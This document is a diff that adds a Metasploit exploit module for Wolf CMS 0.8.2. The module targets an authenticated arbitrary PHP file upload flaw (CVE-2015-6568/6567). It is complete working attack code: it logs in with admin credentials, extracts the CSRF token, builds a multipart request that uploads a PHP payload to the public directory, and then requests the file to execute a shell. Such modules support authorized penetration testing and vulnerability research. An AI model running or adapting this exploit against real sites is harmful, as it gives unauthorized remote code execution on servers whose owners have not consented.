@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+    def initialize
+    super(
+      'Name'           => 'Wolfcms 0.8.2 Arbitrary PHP File Upload Vulnerability',
+      'Description'    => %q{
+        This module exploits a file upload vulnerability in Wolfcms
+        version 0.8.2. This application has an upload feature that 
+        allows an authenticated user with administrator roles to upload 
+        arbitrary files to the '/public' directory.
+      },
+      'Author'         => [
+        'Narendra Bhati', # Proof of concept
+        'Rahmat Nurfauzi' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2015-6568'], 
+          ['CVE', '2015-6567'],
+          ['OSVDB','126852'],          
+          ['EDB', '38000'],
+        ],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Wolfcms <= 0.8.2', {}]
+        ],
+      'DisclosureDate' => 'Aug 28 2015',
+      'Privileged'     => false,      
+      'DefaultTarget' => 0
+    )
+
+    register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to wolfcms', '/wolfcms']),
+          OptString.new('USER', [true, 'User to login with', '']),
+          OptString.new('PASS', [true, 'Password to login with', '']),
+        ], self.class)
+    end
+  
+  def login
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri, "/?/admin/login/login/"),
+      'vars_post' => {
+          "login[username]" => datastore['USER'],
+          "login[password]" => datastore['PASS'],
+          "login[redirect]" => "/wolfcms/?/admin"
+      }
+    })
+    return res
+  end
+
+  def exploit
+
+    upload_name = rand_text_alpha(5 + rand(5)) + '.php'
+
+    get_cookie = login.get_cookies
+    cookie = get_cookie.split(";")[3]
+
+    token = send_request_cgi({
+      'method' => 'GET',
+      'cookie' => cookie,
+      'uri'    => normalize_uri(target_uri, "/?/admin/plugin/file_manager/browse/")     
+    })
+
+    html = token.body
+    if html =~ /Files/
+      print_status("Login successfuly")
+    end
+    csrf_token = html.scan(/<input\s*id=\"csrf_token\"\s*name=\"csrf_token\"\s*type=\"hidden\"\s*value=\"(.*)"/).last.first
+
+    boundary = Rex::Text.rand_text_hex(28)
+
+    data = "-----------------------------#{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"csrf_token\"\r\n"
+    data << "\r\n"
+    data << csrf_token
+    data << "\r\n"
+    data << "-----------------------------#{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"upload[path]\"\r\n\r\n"
+    data << "/"
+    data << "\r\n"
+    data << "-----------------------------#{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"upload_file\"; filename=\"#{upload_name}\"\r\n"
+    data << "Content-Type: text/x-php\r\n"
+    data << "\r\n"
+    data << payload.encoded
+    data << "\r\n"
+    data << "-----------------------------#{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"commit\"\r\n"
+    data << "\r\n"
+    data << "Upload\r\n"
+    data << "-----------------------------#{boundary}--\r\n\r\n"
+
+    print_good("#{peer} - Payload uploaded as #{upload_name}")
+
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'headers' =>
+      {
+        'Content-Type'   => 'multipart/form-data; boundary=---------------------------' + boundary,
+        'Cookie'   => cookie,
+      },
+      'uri' => normalize_uri(target_uri, "/?/admin/plugin/file_manager/upload/")     
+    })
+    
+    register_file_for_cleanup(upload_name)
+
+    print_status("#{peer} - Executing shell...")
+
+    send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "public",upload_name),
+    })
+   
+  end    
+end
